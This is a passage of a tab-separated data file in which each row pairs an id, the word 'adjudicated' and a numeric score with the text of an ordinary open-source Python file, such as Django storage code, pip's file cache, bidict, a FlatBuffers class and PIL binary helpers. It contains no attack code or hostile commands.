'No'), (True, 'Yes')], default='', verbose_name='Attending?')),<<NEWL>>                ('invited', models.IntegerField(choices=[(0, 'Draft'), (1, 'Invited')], default=0)),<<NEWL>>                ('event', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, related_name='guests', to='weddingapp.event')),<<NEWL>>            ],<<NEWL>>            options={<<NEWL>>                'ordering': ['-guest_name'],<<NEWL>>            },<<NEWL>>        ),<<NEWL>>    ]
7	adjudicated	4	"# Copyright 2009-2022 Joshua Bronson. All rights reserved.<<NEWL>>#<<NEWL>># This Source Code Form is subject to the terms of the Mozilla Public<<NEWL>># License, v. 2.0. If a copy of the MPL was not distributed with this<<NEWL>># file, You can obtain one at http://mozilla.org/MPL/2.0/.<<NEWL>><<NEWL>><<NEWL>>#                             * Code review nav *<<NEWL>>#                        (see comments in __init__.py)<<NEWL>>#==============================================================================<<NEWL>># â Prev: _base.py          Current: _frozenbidict.py       Next: _bidict.py â<<NEWL>>#==============================================================================<<NEWL>><<NEWL>>""""""Provide :class:`frozenbidict`, an immutable, hashable bidirectional mapping type.""""""<<NEWL>><<NEWL>>import typing as t<<NEWL>><<NEWL>>from ._base import BidictBase<<NEWL>>from ._typing import KT, VT<<NEWL>><<NEWL>><<NEWL>>class frozenbidict(BidictBase[KT, VT]):<<NEWL>>    """"""Immutable, hashable bidict type.""""""<<NEWL>><<NEWL>>    _hash: int<<NEWL>><<NEWL>>    # Work around lack of support for higher-kinded types in Python.<<NEWL>>    # Ref: https://github.com/python/typing/issues/548#issuecomment-621571821<<NEWL>>    if t.TYPE_CHECKING:<<NEWL>>        @property<<NEWL>>        def inverse(self) -> 'frozenbidict[VT, KT]': ...<<NEWL>><<NEWL>>    def __hash__(self) -> int:<<NEWL>>        """"""The hash of this bidict as determined by its items.""""""<<NEWL>>        if getattr(self, '_hash', None) is None:<<NEWL>>            # The following is like hash(frozenset(self.items()))<<NEWL>>            # but more memory efficient. See also: https://bugs.python.org/issue46684<<NEWL>>            self._hash = t.ItemsView(self)._hash()  # type: ignore [attr-defined]  # https://github.com/python/typeshed/pull/7153<<NEWL>>        return self._hash<<NEWL>><<NEWL>><<NEWL>>#                             * Code review nav *<<NEWL>>#==============================================================================<<NEWL>># â Prev: _base.py          Current: _frozenbidict.py       Next: _bidict.py â<<NEWL>>#=============================================================================="
489	adjudicated	3	"from django.contrib.messages.storage.base import BaseStorage<<NEWL>>from django.contrib.messages.storage.cookie import CookieStorage<<NEWL>>from django.contrib.messages.storage.session import SessionStorage<<NEWL>><<NEWL>><<NEWL>>class FallbackStorage(BaseStorage):<<NEWL>>    """"""<<NEWL>>    Try to store all messages in the first backend. Store any unstored<<NEWL>>    messages in each subsequent backend.<<NEWL>>    """"""<<NEWL>>    storage_classes = (CookieStorage, SessionStorage)<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>>        self.storages = [storage_class(*args, **kwargs)<<NEWL>>                         for storage_class in self.storage_classes]<<NEWL>>        self._used_storages = set()<<NEWL>><<NEWL>>    def _get(self, *args, **kwargs):<<NEWL>>        """"""<<NEWL>>        Get a single list of messages from all storage backends.<<NEWL>>        """"""<<NEWL>>        all_messages = []<<NEWL>>        for storage in self.storages:<<NEWL>>            messages, all_retrieved = storage._get()<<NEWL>>            # If the backend hasn't been used, no more retrieval is necessary.<<NEWL>>            if messages is None:<<NEWL>>                break<<NEWL>>            if messages:<<NEWL>>                self._used_storages.add(storage)<<NEWL>>            all_messages.extend(messages)<<NEWL>>            # If this storage class contained all the messages, no further<<NEWL>>            # retrieval is necessary<<NEWL>>            if all_retrieved:<<NEWL>>                break<<NEWL>>        return all_messages, all_retrieved<<NEWL>><<NEWL>>    def _store(self, messages, response, *args, **kwargs):<<NEWL>>        """"""<<NEWL>>        Store the messages and return any unstored messages after trying all<<NEWL>>        backends.<<NEWL>><<NEWL>>        For each storage backend, any messages not stored are passed on to the<<NEWL>>        next backend.<<NEWL>>        """"""<<NEWL>>        for storage in self.storages:<<NEWL>>            if messages:<<NEWL>>                messages = storage._store(messages, response, remove_oldest=False)<<NEWL>>            # Even if there are no more messages, continue iterating to ensure<<NEWL>>            # storages which contained messages are flushed.<<NEWL>>            elif storage in self._used_storages:<<NEWL>>                storage._store([], response)<<NEWL>>                self._used_storages.remove(storage)<<NEWL>>        return messages"
499	adjudicated	4	"""""""Object Utilities.""""""<<NEWL>>from __future__ import absolute_import, unicode_literals<<NEWL>><<NEWL>><<NEWL>>class cached_property(object):<<NEWL>>    """"""Cached property descriptor.<<NEWL>><<NEWL>>    Caches the return value of the get method on first call.<<NEWL>><<NEWL>>    Examples:<<NEWL>>        .. code-block:: python<<NEWL>><<NEWL>>            @cached_property<<NEWL>>            def connection(self):<<NEWL>>                return Connection()<<NEWL>><<NEWL>>            @connection.setter  # Prepares stored value<<NEWL>>            def connection(self, value):<<NEWL>>                if value is None:<<NEWL>>                    raise TypeError('Connection must be a connection')<<NEWL>>                return value<<NEWL>><<NEWL>>            @connection.deleter<<NEWL>>            def connection(self, value):<<NEWL>>                # Additional action to do at del(self.attr)<<NEWL>>                if value is not None:<<NEWL>>                    print('Connection {0!r} deleted'.format(value)<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, fget=None, fset=None, fdel=None, doc=None):<<NEWL>>        self.__get = fget<<NEWL>>        self.__set = fset<<NEWL>>        self.__del = fdel<<NEWL>>        self.__doc__ = doc or fget.__doc__<<NEWL>>        self.__name__ = fget.__name__<<NEWL>>        self.__module__ = fget.__module__<<NEWL>><<NEWL>>    def __get__(self, obj, type=None):<<NEWL>>        if obj is None:<<NEWL>>            return self<<NEWL>>        try:<<NEWL>>            return obj.__dict__[self.__name__]<<NEWL>>        except KeyError:<<NEWL>>            value = obj.__dict__[self.__name__] = self.__get(obj)<<NEWL>>            return value<<NEWL>><<NEWL>>    def __set__(self, obj, value):<<NEWL>>        if obj is None:<<NEWL>>            return self<<NEWL>>        if self.__set is not None:<<NEWL>>            value = self.__set(obj, value)<<NEWL>>        obj.__dict__[self.__name__] = value<<NEWL>><<NEWL>>    def __delete__(self, obj, _sentinel=object()):<<NEWL>>        if obj is None:<<NEWL>>            return self<<NEWL>>        value = obj.__dict__.pop(self.__name__, _sentinel)<<NEWL>>        if self.__del is not None and value is not _sentinel:<<NEWL>>            self.__del(obj, value)<<NEWL>><<NEWL>>    def setter(self, fset):<<NEWL>>        return self.__class__(self.__get, fset, self.__del)<<NEWL>><<NEWL>>    def deleter(self, fdel):<<NEWL>>        return self.__class__(self.__get, self.__set, fdel)"
157	adjudicated	2	"""""""HTTP cache implementation.<<NEWL>>""""""<<NEWL>><<NEWL>>import os<<NEWL>>from contextlib import contextmanager<<NEWL>>from typing import Generator, Optional<<NEWL>><<NEWL>>from pip._vendor.cachecontrol.cache import BaseCache<<NEWL>>from pip._vendor.cachecontrol.caches import FileCache<<NEWL>>from pip._vendor.requests.models import Response<<NEWL>><<NEWL>>from pip._internal.utils.filesystem import adjacent_tmp_file, replace<<NEWL>>from pip._internal.utils.misc import ensure_dir<<NEWL>><<NEWL>><<NEWL>>def is_from_cache(response: Response) -> bool:<<NEWL>>    return getattr(response, ""from_cache"", False)<<NEWL>><<NEWL>><<NEWL>>@contextmanager<<NEWL>>def suppressed_cache_errors() -> Generator[None, None, None]:<<NEWL>>    """"""If we can't access the cache then we can just skip caching and process<<NEWL>>    requests as if caching wasn't enabled.<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        yield<<NEWL>>    except OSError:<<NEWL>>        pass<<NEWL>><<NEWL>><<NEWL>>class SafeFileCache(BaseCache):<<NEWL>>    """"""<<NEWL>>    A file based cache which is safe to use even when the target directory may<<NEWL>>    not be accessible or writable.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, directory: str) -> None:<<NEWL>>        assert directory is not None, ""Cache directory must not be None.""<<NEWL>>        super().__init__()<<NEWL>>        self.directory = directory<<NEWL>><<NEWL>>    def _get_cache_path(self, name: str) -> str:<<NEWL>>        # From cachecontrol.caches.file_cache.FileCache._fn, brought into our<<NEWL>>        # class for backwards-compatibility and to avoid using a non-public<<NEWL>>        # method.<<NEWL>>        hashed = FileCache.encode(name)<<NEWL>>        parts = list(hashed[:5]) + [hashed]<<NEWL>>        return os.path.join(self.directory, *parts)<<NEWL>><<NEWL>>    def get(self, key: str) -> Optional[bytes]:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            with open(path, ""rb"") as f:<<NEWL>>                return f.read()<<NEWL>><<NEWL>>    def set(self, key: str, value: bytes, expires: Optional[int] = None) -> None:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            ensure_dir(os.path.dirname(path))<<NEWL>><<NEWL>>            with adjacent_tmp_file(path) as f:<<NEWL>>                f.write(value)<<NEWL>><<NEWL>>            replace(f.name, path)<<NEWL>><<NEWL>>    def delete(self, key: str) -> None:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            os.remove(path)"
17	adjudicated	2	# model settings<<NEWL>>model = dict(<<NEWL>>    type='RPN',<<NEWL>>    backbone=dict(<<NEWL>>        type='ResNet',<<NEWL>>        depth=50,<<NEWL>>        num_stages=3,<<NEWL>>        strides=(1, 2, 2),<<NEWL>>        dilations=(1, 1, 1),<<NEWL>>        out_indices=(2, ),<<NEWL>>        frozen_stages=1,<<NEWL>>        norm_cfg=dict(type='BN', requires_grad=False),<<NEWL>>        norm_eval=True,<<NEWL>>        style='caffe',<<NEWL>>        init_cfg=dict(<<NEWL>>            type='Pretrained',<<NEWL>>            checkpoint='open-mmlab://detectron2/resnet50_caffe')),<<NEWL>>    neck=None,<<NEWL>>    rpn_head=dict(<<NEWL>>        type='RPNHead',<<NEWL>>        in_channels=1024,<<NEWL>>        feat_channels=1024,<<NEWL>>        anchor_generator=dict(<<NEWL>>            type='AnchorGenerator',<<NEWL>>            scales=[2, 4, 8, 16, 32],<<NEWL>>            ratios=[0.5, 1.0, 2.0],<<NEWL>>            strides=[16]),<<NEWL>>        bbox_coder=dict(<<NEWL>>            type='DeltaXYWHBBoxCoder',<<NEWL>>            target_means=[.0, .0, .0, .0],<<NEWL>>            target_stds=[1.0, 1.0, 1.0, 1.0]),<<NEWL>>        loss_cls=dict(<<NEWL>>            type='CrossEntropyLoss', use_sigmoid=True, loss_weight=1.0),<<NEWL>>        loss_bbox=dict(type='L1Loss', loss_weight=1.0)),<<NEWL>>    # model training and testing settings<<NEWL>>    train_cfg=dict(<<NEWL>>        rpn=dict(<<NEWL>>            assigner=dict(<<NEWL>>                type='MaxIoUAssigner',<<NEWL>>                pos_iou_thr=0.7,<<NEWL>>                neg_iou_thr=0.3,<<NEWL>>                min_pos_iou=0.3,<<NEWL>>                ignore_iof_thr=-1),<<NEWL>>            sampler=dict(<<NEWL>>                type='RandomSampler',<<NEWL>>                num=256,<<NEWL>>                pos_fraction=0.5,<<NEWL>>                neg_pos_ub=-1,<<NEWL>>                add_gt_as_proposals=False),<<NEWL>>            allowed_border=0,<<NEWL>>            pos_weight=-1,<<NEWL>>            debug=False)),<<NEWL>>    test_cfg=dict(<<NEWL>>        rpn=dict(<<NEWL>>            nms_pre=12000,<<NEWL>>            max_per_img=2000,<<NEWL>>            nms=dict(type='nms', iou_threshold=0.7),<<NEWL>>            min_bbox_size=0)))
386	adjudicated	2	"""""""<<NEWL>>rest_framework.schemas<<NEWL>><<NEWL>>schemas:<<NEWL>>    __init__.py<<NEWL>>    generators.py   # Top-down schema generation<<NEWL>>    inspectors.py   # Per-endpoint view introspection<<NEWL>>    utils.py        # Shared helper functions<<NEWL>>    views.py        # Houses `SchemaView`, `APIView` subclass.<<NEWL>><<NEWL>>We expose a minimal ""public"" API directly from `schemas`. This covers the<<NEWL>>basic use-cases:<<NEWL>><<NEWL>>    from rest_framework.schemas import (<<NEWL>>        AutoSchema,<<NEWL>>        ManualSchema,<<NEWL>>        get_schema_view,<<NEWL>>        SchemaGenerator,<<NEWL>>    )<<NEWL>><<NEWL>>Other access should target the submodules directly<<NEWL>>""""""<<NEWL>>from rest_framework.settings import api_settings<<NEWL>><<NEWL>>from . import coreapi, openapi<<NEWL>>from .coreapi import AutoSchema, ManualSchema, SchemaGenerator  # noqa<<NEWL>>from .inspectors import DefaultSchema  # noqa<<NEWL>><<NEWL>><<NEWL>>def get_schema_view(<<NEWL>>    title=None,<<NEWL>>    url=None,<<NEWL>>    description=None,<<NEWL>>    urlconf=None,<<NEWL>>    renderer_classes=None,<<NEWL>>    public=False,<<NEWL>>    patterns=None,<<NEWL>>    generator_class=None,<<NEWL>>    authentication_classes=api_settings.DEFAULT_AUTHENTICATION_CLASSES,<<NEWL>>    permission_classes=api_settings.DEFAULT_PERMISSION_CLASSES,<<NEWL>>    version=None,<<NEWL>>):<<NEWL>>    """"""<<NEWL>>    Return a schema view.<<NEWL>>    """"""<<NEWL>>    if generator_class is None:<<NEWL>>        if coreapi.is_enabled():<<NEWL>>            generator_class = coreapi.SchemaGenerator<<NEWL>>        else:<<NEWL>>            generator_class = openapi.SchemaGenerator<<NEWL>><<NEWL>>    generator = generator_class(<<NEWL>>        title=title,<<NEWL>>        url=url,<<NEWL>>        description=description,<<NEWL>>        urlconf=urlconf,<<NEWL>>        patterns=patterns,<<NEWL>>        version=version,<<NEWL>>    )<<NEWL>><<NEWL>>    # Avoid import cycle on APIView<<NEWL>>    from .views import SchemaView<<NEWL>><<NEWL>>    return SchemaView.as_view(<<NEWL>>        renderer_classes=renderer_classes,<<NEWL>>        schema_generator=generator,<<NEWL>>        public=public,<<NEWL>>        authentication_classes=authentication_classes,<<NEWL>>        permission_classes=permission_classes,<<NEWL>>    )"
106	adjudicated	4	"""""""rope refactor package<<NEWL>><<NEWL>>This package contains modules that perform python refactorings.<<NEWL>>Refactoring classes perform refactorings in 4 steps:<<NEWL>><<NEWL>>1. Collect some data for performing the refactoring and use them<<NEWL>>   to construct a refactoring class.  Like::<<NEWL>><<NEWL>>     renamer = Rename(project, resource, offset)<<NEWL>><<NEWL>>2. Some refactorings give you useful information about the<<NEWL>>   refactoring after their construction.  Like::<<NEWL>><<NEWL>>     print(renamer.get_old_name())<<NEWL>><<NEWL>>3. Give the refactoring class more information about how to<<NEWL>>   perform the refactoring and get the changes this refactoring is<<NEWL>>   going to make.  This is done by calling `get_changes` method of the<<NEWL>>   refactoring class.  Like::<<NEWL>><<NEWL>>     changes = renamer.get_changes(new_name)<<NEWL>><<NEWL>>4. You can commit the changes.  Like::<<NEWL>><<NEWL>>     project.do(changes)<<NEWL>><<NEWL>>These steps are like the steps IDEs usually do for performing a<<NEWL>>refactoring.  These are the things an IDE does in each step:<<NEWL>><<NEWL>>1. Construct a refactoring object by giving it information like<<NEWL>>   resource, offset and ... .  Some of the refactoring problems (like<<NEWL>>   performing rename refactoring on language keywords) can be reported<<NEWL>>   here.<<NEWL>>2. Print some information about the refactoring and ask the user<<NEWL>>   about the information that are necessary for completing the<<NEWL>>   refactoring (like new name).<<NEWL>>3. Call the `get_changes` by passing it information asked from<<NEWL>>   the user (if necessary) and get and preview the changes returned by<<NEWL>>   it.<<NEWL>>4. perform the refactoring.<<NEWL>><<NEWL>>From ``0.5m5`` release the `get_changes()` method of some time-<<NEWL>>consuming refactorings take an optional `rope.base.taskhandle.<<NEWL>>TaskHandle` parameter.  You can use this object for stopping or<<NEWL>>monitoring the progress of refactorings.<<NEWL>><<NEWL>>""""""<<NEWL>>from rope.refactor.importutils import ImportOrganizer  # noqa<<NEWL>>from rope.refactor.topackage import ModuleToPackage  # noqa<<NEWL>><<NEWL>>__all__ = [<<NEWL>>    ""rename"",<<NEWL>>    ""move"",<<NEWL>>    ""inline"",<<NEWL>>    ""extract"",<<NEWL>>    ""restructure"",<<NEWL>>    ""topackage"",<<NEWL>>    ""importutils"",<<NEWL>>    ""usefunction"",<<NEWL>>    ""change_signature"",<<NEWL>>    ""encapsulate_field"",<<NEWL>>    ""introduce_factory"",<<NEWL>>    ""introduce_parameter"",<<NEWL>>    ""localtofield"",<<NEWL>>    ""method_object"",<<NEWL>>    ""multiproject"",<<NEWL>>]"
297	adjudicated	0	"#  Copyright 2022 Google LLC<<NEWL>>#<<NEWL>>#  Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>>#  you may not use this file except in compliance with the License.<<NEWL>>#  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>>#  Unless required by applicable law or agreed to in writing, software<<NEWL>>#  distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>>#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>>#  See the License for the specific language governing permissions and<<NEWL>>#  limitations under the License.<<NEWL>>import uuid<<NEWL>><<NEWL>><<NEWL>>import google.auth<<NEWL>>from google.cloud import batch_v1<<NEWL>>from google.cloud import storage<<NEWL>>import pytest<<NEWL>><<NEWL>>from .test_basics import _test_body<<NEWL>>from ..create.create_with_mounted_bucket import create_script_job_with_bucket<<NEWL>><<NEWL>>PROJECT = google.auth.default()[1]<<NEWL>>REGION = 'europe-north1'<<NEWL>><<NEWL>>TIMEOUT = 600  # 10 minutes<<NEWL>><<NEWL>>WAIT_STATES = {<<NEWL>>    batch_v1.JobStatus.State.STATE_UNSPECIFIED,<<NEWL>>    batch_v1.JobStatus.State.QUEUED,<<NEWL>>    batch_v1.JobStatus.State.RUNNING,<<NEWL>>    batch_v1.JobStatus.State.SCHEDULED,<<NEWL>>}<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def job_name():<<NEWL>>    return f""test-job-{uuid.uuid4().hex[:10]}""<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture()<<NEWL>>def test_bucket():<<NEWL>>    bucket_name = f""test-bucket-{uuid.uuid4().hex[:8]}""<<NEWL>>    client = storage.Client()<<NEWL>>    client.create_bucket(bucket_name, location=""eu"")<<NEWL>><<NEWL>>    yield bucket_name<<NEWL>><<NEWL>>    bucket = client.get_bucket(bucket_name)<<NEWL>>    bucket.delete(force=True)<<NEWL>><<NEWL>><<NEWL>>def _test_bucket_content(test_bucket):<<NEWL>>    client = storage.Client()<<NEWL>>    bucket = client.get_bucket(test_bucket)<<NEWL>><<NEWL>>    file_name_template = ""output_task_{task_number}.txt""<<NEWL>>    file_content_template = ""Hello world from task {task_number}.\n""<<NEWL>><<NEWL>>    for i in range(4):<<NEWL>>        blob = bucket.blob(file_name_template.format(task_number=i))<<NEWL>>        content = blob.download_as_bytes().decode()<<NEWL>>        assert content == file_content_template.format(task_number=i)<<NEWL>><<NEWL>><<NEWL>>def test_bucket_job(job_name, test_bucket):<<NEWL>>    job = create_script_job_with_bucket(PROJECT, REGION, job_name, test_bucket)<<NEWL>>    _test_body(job, lambda: _test_bucket_content(test_bucket))"
46	adjudicated	2	"#<<NEWL>># Copyright 2017 the original author or authors.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>><<NEWL>>""""""<<NEWL>>Some docker related convenience functions<<NEWL>>""""""<<NEWL>>from datetime import datetime<<NEWL>>from concurrent.futures import ThreadPoolExecutor<<NEWL>><<NEWL>>import os<<NEWL>>import socket<<NEWL>>from structlog import get_logger<<NEWL>><<NEWL>>from docker import Client, errors<<NEWL>><<NEWL>><<NEWL>>docker_socket = os.environ.get('DOCKER_SOCK', 'unix://tmp/docker.sock')<<NEWL>>log = get_logger()<<NEWL>><<NEWL>>def get_my_containers_name():<<NEWL>>    """"""<<NEWL>>    Return the docker containers name in which this process is running.<<NEWL>>    To look up the container name, we use the container ID extracted from the<<NEWL>>    $HOSTNAME environment variable (which is set by docker conventions).<<NEWL>>    :return: String with the docker container name (or None if any issue is<<NEWL>>             encountered)<<NEWL>>    """"""<<NEWL>>    my_container_id = os.environ.get('HOSTNAME', None)<<NEWL>><<NEWL>>    try:<<NEWL>>        docker_cli = Client(base_url=docker_socket)<<NEWL>>        info = docker_cli.inspect_container(my_container_id)<<NEWL>><<NEWL>>    except Exception, e:<<NEWL>>        log.exception('failed', my_container_id=my_container_id, e=e)<<NEWL>>        raise<<NEWL>><<NEWL>>    name = info['Name'].lstrip('/')<<NEWL>><<NEWL>>    return name<<NEWL>><<NEWL>>def get_all_running_containers():<<NEWL>>    try:<<NEWL>>        docker_cli = Client(base_url=docker_socket)<<NEWL>>        containers = docker_cli.containers()<<NEWL>><<NEWL>>    except Exception, e:<<NEWL>>        log.exception('failed', e=e)<<NEWL>>        raise<<NEWL>><<NEWL>>    return containers<<NEWL>><<NEWL>>def inspect_container(id):<<NEWL>>    try:<<NEWL>>        docker_cli = Client(base_url=docker_socket)<<NEWL>>        info = docker_cli.inspect_container(id)<<NEWL>>    except Exception, e:<<NEWL>>        log.exception('failed-inspect-container', id=id, e=e)<<NEWL>>        raise<<NEWL>><<NEWL>>    return info<<NEWL>>"
264	adjudicated	1	"# automatically generated by the FlatBuffers compiler, do not modify<<NEWL>><<NEWL>># namespace: proto<<NEWL>><<NEWL>>import flatbuffers<<NEWL>>from flatbuffers.compat import import_numpy<<NEWL>>np = import_numpy()<<NEWL>><<NEWL>>class RouterRoles(object):<<NEWL>>    __slots__ = ['_tab']<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def GetRootAs(cls, buf, offset=0):<<NEWL>>        n = flatbuffers.encode.Get(flatbuffers.packer.uoffset, buf, offset)<<NEWL>>        x = RouterRoles()<<NEWL>>        x.Init(buf, n + offset)<<NEWL>>        return x<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def GetRootAsRouterRoles(cls, buf, offset=0):<<NEWL>>        """"""This method is deprecated. Please switch to GetRootAs.""""""<<NEWL>>        return cls.GetRootAs(buf, offset)<<NEWL>>    # RouterRoles<<NEWL>>    def Init(self, buf, pos):<<NEWL>>        self._tab = flatbuffers.table.Table(buf, pos)<<NEWL>><<NEWL>>    # RouterRoles<<NEWL>>    def Broker(self):<<NEWL>>        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(4))<<NEWL>>        if o != 0:<<NEWL>>            x = self._tab.Indirect(o + self._tab.Pos)<<NEWL>>            from wamp.proto.BrokerFeatures import BrokerFeatures<<NEWL>>            obj = BrokerFeatures()<<NEWL>>            obj.Init(self._tab.Bytes, x)<<NEWL>>            return obj<<NEWL>>        return None<<NEWL>><<NEWL>>    # RouterRoles<<NEWL>>    def Dealer(self):<<NEWL>>        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(6))<<NEWL>>        if o != 0:<<NEWL>>            x = self._tab.Indirect(o + self._tab.Pos)<<NEWL>>            from wamp.proto.DealerFeatures import DealerFeatures<<NEWL>>            obj = DealerFeatures()<<NEWL>>            obj.Init(self._tab.Bytes, x)<<NEWL>>            return obj<<NEWL>>        return None<<NEWL>><<NEWL>>def RouterRolesStart(builder): builder.StartObject(2)<<NEWL>>def Start(builder):<<NEWL>>    return RouterRolesStart(builder)<<NEWL>>def RouterRolesAddBroker(builder, broker): builder.PrependUOffsetTRelativeSlot(0, flatbuffers.number_types.UOffsetTFlags.py_type(broker), 0)<<NEWL>>def AddBroker(builder, broker):<<NEWL>>    return RouterRolesAddBroker(builder, broker)<<NEWL>>def RouterRolesAddDealer(builder, dealer): builder.PrependUOffsetTRelativeSlot(1, flatbuffers.number_types.UOffsetTFlags.py_type(dealer), 0)<<NEWL>>def AddDealer(builder, dealer):<<NEWL>>    return RouterRolesAddDealer(builder, dealer)<<NEWL>>def RouterRolesEnd(builder): return builder.EndObject()<<NEWL>>def End(builder):<<NEWL>>    return RouterRolesEnd(builder)"
324	adjudicated	0	from urllib.parse import parse_qsl, unquote, urlparse, urlunparse<<NEWL>><<NEWL>>from django import template<<NEWL>>from django.contrib.admin.utils import quote<<NEWL>>from django.urls import Resolver404, get_script_prefix, resolve<<NEWL>>from django.utils.http import urlencode<<NEWL>><<NEWL>>register = template.Library()<<NEWL>><<NEWL>><<NEWL>>@register.filter<<NEWL>>def admin_urlname(value, arg):<<NEWL>>    return 'admin:%s_%s_%s' % (value.app_label, value.model_name, arg)<<NEWL>><<NEWL>><<NEWL>>@register.filter<<NEWL>>def admin_urlquote(value):<<NEWL>>    return quote(value)<<NEWL>><<NEWL>><<NEWL>>@register.simple_tag(takes_context=True)<<NEWL>>def add_preserved_filters(context, url, popup=False, to_field=None):<<NEWL>>    opts = context.get('opts')<<NEWL>>    preserved_filters = context.get('preserved_filters')<<NEWL>><<NEWL>>    parsed_url = list(urlparse(url))<<NEWL>>    parsed_qs = dict(parse_qsl(parsed_url[4]))<<NEWL>>    merged_qs = {}<<NEWL>><<NEWL>>    if opts and preserved_filters:<<NEWL>>        preserved_filters = dict(parse_qsl(preserved_filters))<<NEWL>><<NEWL>>        match_url = '/%s' % unquote(url).partition(get_script_prefix())[2]<<NEWL>>        try:<<NEWL>>            match = resolve(match_url)<<NEWL>>        except Resolver404:<<NEWL>>            pass<<NEWL>>        else:<<NEWL>>            current_url = '%s:%s' % (match.app_name, match.url_name)<<NEWL>>            changelist_url = 'admin:%s_%s_changelist' % (opts.app_label, opts.model_name)<<NEWL>>            if changelist_url == current_url and '_changelist_filters' in preserved_filters:<<NEWL>>                preserved_filters = dict(parse_qsl(preserved_filters['_changelist_filters']))<<NEWL>><<NEWL>>        merged_qs.update(preserved_filters)<<NEWL>><<NEWL>>    if popup:<<NEWL>>        from django.contrib.admin.options import IS_POPUP_VAR<<NEWL>>        merged_qs[IS_POPUP_VAR] = 1<<NEWL>>    if to_field:<<NEWL>>        from django.contrib.admin.options import TO_FIELD_VAR<<NEWL>>        merged_qs[TO_FIELD_VAR] = to_field<<NEWL>><<NEWL>>    merged_qs.update(parsed_qs)<<NEWL>><<NEWL>>    parsed_url[4] = urlencode(merged_qs)<<NEWL>>    return urlunparse(parsed_url)
235	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""scatterpolargl.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
375	adjudicated	2	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># Binary input/output support routines.<<NEWL>>#<<NEWL>># Copyright (c) 1997-2003 by Secret Labs AB<<NEWL>># Copyright (c) 1995-2003 by Fredrik Lundh<<NEWL>># Copyright (c) 2012 by Brian Crowell<<NEWL>>#<<NEWL>># See the README file for information on usage and redistribution.<<NEWL>>#<<NEWL>><<NEWL>><<NEWL>>""""""Binary input/output support routines.""""""<<NEWL>><<NEWL>><<NEWL>>from struct import pack, unpack_from<<NEWL>><<NEWL>><<NEWL>>def i8(c):<<NEWL>>    return c if c.__class__ is int else c[0]<<NEWL>><<NEWL>><<NEWL>>def o8(i):<<NEWL>>    return bytes((i & 255,))<<NEWL>><<NEWL>><<NEWL>># Input, le = little endian, be = big endian<<NEWL>>def i16le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to an unsigned integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<H"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si16le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to a signed integer.<<NEWL>><<NEWL>>    :param 